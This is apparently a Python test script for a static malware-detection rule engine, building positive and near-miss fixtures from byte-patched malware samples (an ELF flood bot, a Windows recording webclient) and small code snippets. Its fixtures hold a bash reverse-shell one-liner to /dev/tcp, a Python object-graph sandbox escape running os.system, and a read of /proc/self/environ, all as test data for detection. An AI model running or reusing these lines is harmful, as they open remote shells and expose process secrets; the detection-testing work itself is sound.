"""Static controls only: sample bytes and generated source are never executed."""
import argparse
from concurrent.futures import ThreadPoolExecutor
import json
import os
from pathlib import Path
import subprocess

ROOT = Path(__file__).resolve().parents[3]
DOC = 'metadata/package/documentation/security-testing::fenced-security-methodology-skill'
SHELL = 'objectives/command-and-control/reverse-shell/dev-tcp::python-interpolated-devtcp-shell'
ESCAPE = 'objectives/execution/exploit/sandbox-escape::python-object-graph-command-execution'
HDF = 'objectives/credential-access/files/hdf5-external::hdf5-external-runtime-secret-reference'
CORRUPT = 'objectives/impact/degrade/system/file::mips-power-utility-corruption-profile'
FLOOD = 'objectives/impact/dos/attack/botnet::elfood-flood-tasking-bot'
WRITE = 'micro-behaviors/fs/write/file/descriptor::mips-o32-write-syscall-le'
HTTP = 'micro-behaviors/communications/http/client/managed::managed-keyboard-recording-webclient-references'
LABEL = 'micro-behaviors/communications/flood::udp-flood-attack-label'


def main():
    ap = argparse.ArgumentParser(description=__doc__)
    ap.add_argument('--samples', type=Path, required=True)
    ap.add_argument('--extracted', type=Path, required=True)
    ap.add_argument('--work-dir', type=Path, required=True)
    ap.add_argument('--cleave', default='cleave')
    a = ap.parse_args()
    a.work_dir.mkdir(parents=True, exist_ok=True)
    cases = []

    def add(name, content, expected):
        path = a.work_dir / name
        path.parent.mkdir(parents=True, exist_ok=True)
        path.write_bytes(content.encode() if isinstance(content, str) else content)
        cases.append((path, expected))

    for name in ('offensive-ssti', 'offensive-ai-security'):
        path = a.extracted / 'travis/resources/skills' / name / 'SKILL.md'
        cases.append((path, {DOC: True, SHELL: False, ESCAPE: False, HDF: False}))
    doc = '''---
name: assessment
description: Security assessment methodology
---
# SSTI -- Offensive Methodology
## Examples
```python
payload = f'bash -i >& /dev/tcp/{host}/{port} 0>&1'
```
**Prevention:**
Use isolated templates and never evaluate untrusted input.
'''
    add('complete/SKILL.md', doc, {DOC: True, SHELL: False})
    add('no-remediation/SKILL.md', doc.replace('**Prevention:**', '**Notes:**'), {DOC: False})
    add('no-heading/SKILL.md', doc.replace('Offensive Methodology', 'Notes'), {DOC: False})
    add('no-frontmatter/SKILL.md', doc.replace('description:', 'summary:'), {DOC: False})
    add('no-fence/SKILL.md', doc.replace('```python', '').replace('```', ''), {DOC: False})
    add('executable.py', doc, {DOC: False, SHELL: True})
    add('escape.py', "classes = ().__class__.__base__.__subclasses__()\nx._module.__builtins__['__import__']('os').system('id')\n", {ESCAPE: True})
    add('sensitive-path.py', "path = '/proc/self/environ'\n", {HDF: False})
    add('external-storage.py', "dcpl.set_external('/proc/self/environ', 0, 4096)\n", {HDF: True})
    elf = (a.samples / 'ccaf6b28b9fe/ccaf6b28b9fe286efa1533e0af5ce57dba11be068aee39e08d1ad5a7796d7d79.elf').read_bytes()
    add('original.elf', elf, {CORRUPT: True, FLOOD: True, WRITE: True, LABEL: True})
    add('no-marker.elf', elf.replace(b'ELFOOD', b'XXXXXX'), {CORRUPT: False, FLOOD: False, WRITE: True, LABEL: True})
    instruction = bytes.fromhex('A4 0F 02 24 0C 00 00 00')
    assert elf.count(instruction) == 1
    add('no-write.elf', elf.replace(instruction, bytes.fromhex('A5 0F 02 24 0C 00 00 00')), {CORRUPT: False, FLOOD: True, WRITE: False})
    add('no-task-labels.elf', elf.replace(b'UDP_FLOOD', b'XXXXXXXXX'), {CORRUPT: True, FLOOD: False, LABEL: False})
    no_targets = elf
    for target in (b'reboot', b'shutdown', b'poweroff', b'halt'):
        no_targets = no_targets.replace(target, b'X' * len(target))
    add('no-power-targets.elf', no_targets, {CORRUPT: False, FLOOD: True, WRITE: True})
    pe = (a.samples / 'cc6df95633a4/socolivetv.ca_nano.exe').read_bytes()
    add('original.exe', pe, {HTTP: True})
    add('no-upload.exe', pe.replace(b'UploadString\0', b'XXXXXXXXXXXX\0'), {HTTP: False})
    add('no-recording.exe', pe.replace(b'Append\0', b'XXXXXX\0'), {HTTP: False})

    syntax = 'metadata/lang/source/syntax::regex-pattern-rule-field'
    cite = 'metadata/package/documentation/source::payloadsallthethings-reference'
    ssrf = 'metadata/package/documentation/claims::ssrf-protection-wording'
    dep = 'metadata/package/dependencies/manifest/identity::pkginfo-playwright-dependency'
    patch = 'metadata/package/dependencies/manifest/identity::patchright-pypi-dependency'
    add('regex-fields.js', 'const rows = [{pattern:/a/}, {pattern:/b/}, {pattern:/c/}];', {syntax: True})
    add('single-regex.js', 'const row = {pattern:/a/};', {syntax: False})
    add('citation.md', '# References\nPayloadsAllTheThings', {cite: True, DOC: False})
    add('claim.py', '# SSRF protection\n', {ssrf: True})
    add('no-claim.py', '# Ordinary HTTP client\n', {ssrf: False})
    add('browser.dist-info/METADATA', 'Metadata-Version: 2.4\nName: example\nVersion: 1\nRequires-Dist: playwright>=1\n', {dep: True, patch: False})
    add('alternative.dist-info/METADATA', 'Metadata-Version: 2.4\nName: example\nVersion: 1\nRequires-Dist: patchright>=1\n', {dep: False, patch: True})

    def check(case):
        path, expected = case
        proc = subprocess.run([a.cleave, '--traits-dir', str(ROOT), '--disable',
                               'radare2,third-party', 'test-rules', str(path),
                               '--rules', ','.join(expected)], capture_output=True,
                              text=True, env={**os.environ, 'CLEAVE_VALIDATE': '0'})
        output = proc.stdout + proc.stderr
        trace = a.work_dir / (path.parent.name + '-' + path.name + '.trace')
        trace.write_text(output)
        assert proc.returncode == 0 and 'Warning: Rule ' not in output and 'ERROR' not in output, output
        actual = {rule: any(line.startswith('MATCHED ' + rule + ' ') for line in output.splitlines())
                  for rule in expected}
        assert actual == expected, (str(path), expected, actual, output)
        return {'case': str(path), 'expected': expected, 'actual': actual}

    with ThreadPoolExecutor(max_workers=3) as pool:
        results = list(pool.map(check, cases))
    (a.work_dir / 'results.json').write_text(json.dumps(results, indent=2) + '\n')
    print(f'{len(results)} static positive and near-miss controls passed')


if __name__ == '__main__':
    main()
